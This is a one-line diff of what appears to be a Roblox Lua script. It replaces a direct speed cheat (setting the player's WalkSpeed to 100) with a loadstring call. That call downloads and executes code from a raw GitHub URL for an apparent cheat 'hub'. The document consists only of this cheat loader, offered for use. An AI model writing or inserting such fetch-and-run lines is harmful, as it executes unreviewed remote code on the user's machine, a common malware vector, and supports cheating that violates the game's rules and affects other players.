@@ -1,1 +1,1 @@
-game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 100
+loadstring(game:HttpGet("https://raw.githubusercontent.com/comet3456998765/SKHub-Orion/main/Your%20hub%20men"))()
